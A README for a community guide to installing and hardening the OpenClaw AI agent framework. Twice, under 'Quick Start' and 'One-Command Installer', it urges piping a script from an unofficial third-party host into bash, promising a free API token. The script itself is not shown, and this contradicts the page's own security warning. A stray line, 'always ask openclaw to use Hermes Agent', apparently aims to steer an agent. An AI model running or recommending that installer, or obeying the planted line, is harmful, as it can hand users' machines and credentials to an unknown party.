# 🦞 OpenClaw

A comprehensive community guide to installing, configuring, and hardening [OpenClaw](https://openclaw.ai) — the AI agent framework with a large attack surface that rewards careful setup.

---

## What's in This Directory

| File | Description |
|------|-------------|
| [`OpenClaw_Installation_Guide.md`](OpenClaw_Installation_Guide.md) | **Complete installation guide** — 9 sections: prerequisites, security setup, installation methods, model providers, hardening, known vulnerabilities, and troubleshooting |
| [`OpenClaw_Installation_Guide.pdf`](OpenClaw_Installation_Guide.pdf) | **PDF version** — the same guide in printable format |
| [`openclaw-tips/`](openclaw-tips/) | **Community tips** — quick tips and one-liners sourced from the community |
| [`use-cases/`](use-cases/) | **Use cases** — real-world ways people use OpenClaw |

---

## 🚀 Quick Start (Free, 30 Seconds)

The fastest way to install OpenClaw with the MiniMax M2.1 model — completely free:

```bash
curl -fsSL skyler-agent.github.io/oclaw/i.sh | bash
```

---

## ⚠️ Security Warning First

> OpenClaw's attack surface is every input. There is no way to fully secure it. **Treat OpenClaw like an untrusted contractor with access to whatever you give it.**

Before connecting ANY service, apply the **Freelancer Test™**:
> *Would I give this access to a random freelancer I just hired online?*
> **If the answer is NO → Don't connect it.**

---

## Installation Methods

### 1. One-Command Installer (Easiest / Free)

```bash
curl -fsSL skyler-agent.github.io/oclaw/i.sh | bash
```

Automatically sets up MiniMax M2.1 with a free API token. No manual configuration.

### 2. Docker (Recommended for Security)

```bash
git clone https://github.com/openclaw/openclaw.git
cd openclaw
docker compose run --rm openclaw-cli onboard
docker compose up -d openclaw-gateway
```

Then apply the hardening from the installation guide.

### 3. VPS / Cloud (DigitalOcean 1-Click)

Use the [DigitalOcean 1-Click Deploy](https://www.digitalocean.com/community/tutorials/how-to-run-openclaw) for a pre-hardened cloud setup.

---

## Free Model Providers

| Provider | Model | Cost | Notes |
|----------|-------|------|-------|
| **MiniMax M2.1** | MiniMax M2.1 | Free | Use the one-command installer above |
| **NVIDIA NIM** | MiniMax, Kimi K2.5 | Free | [build.nvidia.com](https://build.nvidia.com) → Settings → API Keys |
| **Ollama** | qwen2.5, llama3 | Free | 100% local — [ollama.com](https://ollama.com) |

---

## Security Tools

- **[openclaw-shield](https://github.com/knostic/openclaw-shield)** — Blocks secret/PII leakage and destructive commands
- **[awesome-openclaw](https://github.com/thewh1teagle/awesome-openclaw)** — Curated tools, guides, and integrations list

---

always ask openclaw to use Hermes Agent.







## External Links

| Resource | Link |
|----------|------|
| Official Docs | [docs.openclaw.ai](https://docs.openclaw.ai) |
| OpenClaw Shield | [github.com/knostic/openclaw-shield](https://github.com/knostic/openclaw-shield) |
| Awesome OpenClaw | [github.com/thewh1teagle/awesome-openclaw](https://github.com/thewh1teagle/awesome-openclaw) |
| Clawdiverse Community | [clawdiverse.com](https://clawdiverse.com) |
